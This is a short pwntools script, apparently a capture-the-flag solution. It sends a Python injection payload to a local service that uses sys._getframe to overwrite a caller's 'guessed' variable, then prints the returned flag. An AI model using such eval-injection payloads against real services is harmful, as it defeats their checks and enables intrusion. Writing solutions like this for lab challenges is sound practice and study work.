from pwn import *

context.log_level = 'error'

host, port = '127.0.0.1', 1337
payload = "__import__('sys')._getframe(2).f_locals['guessed'].__setattr__('value',True)"
cnx = remote(host, port)

cnx.recvuntil('>> ')
cnx.sendline(payload.encode())

print(cnx.recvuntil('}').decode())

cnx.close()
